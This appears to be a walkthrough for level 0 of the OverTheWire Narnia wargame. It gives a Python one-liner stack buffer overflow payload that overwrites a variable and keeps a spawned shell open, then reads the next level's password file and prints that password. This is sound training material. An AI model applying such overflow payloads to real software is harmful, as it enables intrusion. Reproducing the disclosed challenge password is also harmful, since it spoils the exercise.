# Walkthrough for the Narnia of OTW

## Introduction:
Try it for yourself before you look for help ;)

## Preparations
I added the server ``narnia.labs.overthewire.org'' and port 2226
into the ssh config file:

    Host narnia.labs.overthewire.org
    port 2226

## Level 0:

Username: narnia0
Passwort: narnia0

The file ist stored in the directory /narnia, the application
is named narnia0, the source code is given in the file narnia0.c.

    cd /narnia

First of all we run the application once and take a look, what it does.

    ./narnia0

After prompting us with the target to change (aka. ``correct'') the value
from 0x41414141 -> 0xdeadbeef we are given the chance to enter something.
Entering ``something'' results in a hint, that this was not correct

    ./narnia0
    something

A single look into the source shows the path. The memory layout and use
of scanf cries for a buffer overflow. Now we just have to generate the payload
and ship it to the program.

Python can be used to create the payload:

    python -c "print(20*'a' + chr(0xef) + chr(0xbe) + chr(0xad) + chr(0xde))" | ./narnia0

which can be piped to the file. Now we are not yelled at, but nothing more is
happening. This is due to line 32. The opened shell is closed directly. This
can be fixed by piping multiple commands into the application:

    (python -c "print(20*'a' + chr(0xef) + chr(0xbe) + chr(0xad) + chr(0xde))"; cat)
        | ./narnia0

With the command ``whoami'' we can check, if everything worked:
    whoami
    -> narnia1

Fine, seems like it worked! Now we cat the password for the next level

    cat /etc/narnia_pass/narnia1

### Lessons learned:

Use ``cat'' to pass the input into the opened shell.


## Level 1:

Username: narnia1
Passwort: efeidiedae
